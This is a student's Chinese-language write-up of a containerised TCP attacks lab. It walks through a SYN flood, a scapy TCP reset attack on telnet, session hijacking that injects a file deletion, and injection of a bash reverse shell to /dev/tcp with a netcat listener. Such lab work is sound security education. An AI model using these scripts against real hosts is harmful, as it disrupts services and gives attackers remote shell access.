## 一、docker使用

docker换源：

```
vim /etc/docker/daemon.json
```

```
{
  "registry-mirrors": ["https://docker.1panel.live"]
}
```

docker创建：

```
docker-compose build
```

docker开启：

```
docker-compose up
```

![image-20241120113741629](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120113741629.png)

ctrl+shift+T 新建一个终端

查询docker状态：

```
dockps
```

![image-20241120113836942](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120113836942.png)

切换docker中的主机，例如：

```
docker exec -it victim-10.9.0.5 bash
```

![image-20241120113934047](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120113934047.png)

## 二、实验

### Task1. SYN泛洪攻击

查看victim

```
sysctl net.ipv4.tcp_max_syn_backlog 
```

![image-20241120151254268](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120151254268.png)

```
netstat -tna
```

![image-20241120151433464](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120151433464.png)

关闭SYNcookie

```
sysctl -w net.ipv4.tcp_syncookies=0
```

![image-20241120151715760](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120151715760.png)

在seed（攻击机）上，编译synflood.c 

```
gcc synflood.c -o synflood
```

切换到攻击机

```
docker exec -it victim-10.9.0.5 bash
```

攻击机目录下volumes与seed机是共享的

使用攻击机对victim进行攻击

```
synflood 10.9.0.5 23
```

在victim上查看网络状态，发现出现了大量不明ip

![image-20241120155145545](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120155145545.png)

稍等一小段时间后

在user1机上尝试telnet连接victim

```
docker exec -it user1-10.9.0.6 bash
telnet 10.9.0.5
```

发现无法连接

![image-20241120160500215](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120160500215.png)

wireshark分析数据包：

![image-20241120162301585](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120162301585.png)

启用syncookie，再次发动攻击

```
sysctl -w net.ipv4.tcp_syncookies=1
```

![image-20241120162443724](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120162443724.png)

发现

![image-20241120163003545](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120163003545.png)

发现虽然还在持续收到syn包

但user1可以telnet连接到victim

![image-20241120162720192](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120162720192.png)

### Task2. 对Telnet的复位攻击

利用seed-attacker作为攻击机，user1作为客户端，victim作为服务端

客户端telnet到服务端

```
docker exec -it user1-10.9.0.6 bash
telnet 10.9.0.5
```

![image-20241120184227016](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120184227016.png)

在主机中编写好RSTattack.py（自动攻击），通过volumes共享到攻击机

```python
#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
	ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
	tcp = TCP(sport=23, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq+1)
	pkt = ip/tcp
	ls(pkt)
	send(pkt, verbose=0)
	
f = f'tcp and src host 10.9.0.5'
pkt = sniff(iface='br-88413f1d34bf', filter=f, prn=spoof_pkt)
```

发现攻击机中没有python，但有apt

但是apt没有源，机器也没有vi，vim等文本编辑器

使用古老方法：

```
echo "deb http://mirrors.163.com/ubuntu/ precise main restricted" >>/etc/apt/sources.list
echo "deb-src http://mirrors.163.com/ubuntu/ precise main restricted" >>/etc/apt/sources.list
echo "deb http://mirrors.163.com/ubuntu/ precise-updates main restricted" >>/etc/apt/sources.list
echo "deb-src http://mirrors.163.com/ubuntu/ precise-updates main restricted" >>/etc/apt/sources.list
echo "deb http://mirrors.163.com/ubuntu/ precise universe" >>/etc/apt/sources.list
echo "deb-src http://mirrors.163.com/ubuntu/ precise universe" >>/etc/apt/sources.list
echo "deb http://mirrors.163.com/ubuntu/ precise-updates universe" >>/etc/apt/sources.list
echo "deb-src http://mirrors.163.com/ubuntu/ precise-updates universe" >>/etc/apt/sources.list
echo "deb http://mirrors.163.com/ubuntu/ precise multiverse" >>/etc/apt/sources.list
echo "deb-src http://mirrors.163.com/ubuntu/ precise multiverse" >>/etc/apt/sources.list
echo "deb http://mirrors.163.com/ubuntu/ precise-updates multiverse" >>/etc/apt/sources.list
echo "deb-src http://mirrors.163.com/ubuntu/ precise-updates multiverse" >>/etc/apt/sources.list
echo "deb http://mirrors.163.com/ubuntu/ precise-backports main restricted universe multiverse" >>/etc/apt/sources.list
echo "deb-src http://mirrors.163.com/ubuntu/ precise-backports main restricted universe multiverse" >>/etc/apt/sources.list
echo "deb http://mirrors.163.com/ubuntu/ precise-security main restricted" >>/etc/apt/sources.list
echo "deb-src http://mirrors.163.com/ubuntu/ precise-security main restricted" >>/etc/apt/sources.list
echo "deb http://mirrors.163.com/ubuntu/ precise-security universe" >>/etc/apt/sources.list
echo "deb-src http://mirrors.163.com/ubuntu/ precise-security universe" >>/etc/apt/sources.list
echo "deb http://mirrors.163.com/ubuntu/ precise-security multiverse" >>/etc/apt/sources.list
echo "deb-src http://mirrors.163.com/ubuntu/ precise-security multiverse" >>/etc/apt/sources.list
echo "deb http://extras.ubuntu.com/ubuntu precise main" >>/etc/apt/sources.list
echo "deb-src http://extras.ubuntu.com/ubuntu precise main" >>/etc/apt/sources.list
```

不用全搞，实测搞几个就可以了

更新apt-get源

```
apt-get update
apt-get install python3-pip
```

在攻击机中运行文件RSTattack.py

```
python3 RSTattack.py
```

![image-20241120195418479](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120195418479.png)

在telnet连接的时候，随便输入一个字符（即发送任意的数据包），就能被攻击者篡改其中的标志位，从而断开连接。

![image-20241120195533211](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241120195533211.png)

### Task3. TCP的会话劫持攻击

将victim作为服务器，user1作为客户端，seed-attacker作为攻击机。

在victim中新建new.txt

```
touch new.txt
echo "helloworld！" >>new.txt
```

![image-20241121102027031](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241121102027031.png)

![image-20241121102533857](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241121102533857.png)

在客户机上telnet服务器，查看刚才创建的文件“new.txt”

![image-20241121102616170](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241121102616170.png)

在攻击机上用Python代码发起会话劫持攻击，删除服务器上的“new.txt”

```python
#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
	tcp = TCP(sport=pkt[TCP].dport, dport=23,
              flags="A",
              seq=pkt[TCP].ack, ack=pkt[TCP].seq+1)
	data = "rm -rf new.txt"
	pkt = ip/tcp/data
	ls(pkt)
	send(pkt, verbose=0)
	
f = f'tcp and src host 10.9.0.5'
pkt = sniff(iface='br-51a3ed64a0eb', filter=f, prn=spoof_pkt)

```

在客户机上使用刚才连接的telnet，看看有什么情况，并请说明原因。

在服务器上发现文件删除成功，并且客户端的光标被锁死，无法输入命令。原因是客户端的终端失去了正确的ack与seq，既无法发出信息，也无法接收信息，也无法退出。



### Task4. 通过TCP的会话劫持攻击创建“Reverse Shell”

编写python程序

```python
#!/usr/bin/env python3

from scapy.all import *

def spoof_pkt(pkt):
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
	tcp = TCP(sport=pkt[TCP].dport, dport=23, flags="A", seq=pkt[TCP].ack, ack=pkt[TCP].seq+1)
	data = "/bin/bash -i > /dev/tcp/10.9.0.1/1234 0<&1 2>&1\n\0"
	pkt = ip/tcp/data
	send(pkt, verbose=0)
    
f = f'tcp and src host 10.9.0.5'
pkt = sniff(iface='br-51a3ed64a0eb', filter=f, prn=spoof_pkt)
```

在attacker上开启监听

```
nc -lnv 1234
```

user1上telnet到victim

再开一个attacher的bash，运行hijackingreverse.py

在user1的telnet连接中打一个空格

成功监听，拿到shell

![image-20241121110204939](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241121110204939.png)

可以在攻击机上远程在victim上执行命令

![image-20241121110501706](C:\Users\29450\AppData\Roaming\Typora\typora-user-images\image-20241121110501706.png)
